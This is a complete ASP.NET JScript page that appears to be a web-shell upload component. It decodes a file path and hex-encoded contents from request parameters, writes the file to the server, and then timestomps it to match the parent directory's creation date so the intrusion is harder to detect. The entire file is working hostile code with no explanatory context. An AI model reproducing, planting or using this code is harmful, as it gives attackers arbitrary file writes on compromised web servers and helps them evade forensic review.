<%@ Page Language="Jscript"%>
<%
Response.Clear();
Response.Write("->|");
var err:Exception;
try{
    var P:String=System.Web.HttpContext.Current.Server.MapPath(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["z1"])));
    var Z:String=Request.Item["z2"];
    var B:byte[]=new byte[Z.Length/2];
    for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}
    var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Create);
    fs.Write(B,0,B.Length);
    fs.Close();
    Response.Write("1");
}catch(err){
    Response.Write("ERROR:// "+err.message);
}
try{
	var DD = P;
	var TM = System.IO.Directory.GetCreationTime(System.IO.Path.GetDirectoryName(DD));
	if(System.IO.File.Exists(DD)){
		System.IO.File.SetCreationTime(DD,TM);
		System.IO.File.SetLastWriteTime(DD,TM);
		System.IO.File.SetLastAccessTime(DD,TM);
	}
}catch(err){
	Response.Write(" set time: "+err.message);
}
Response.Write("|<-");
Response.End();
%>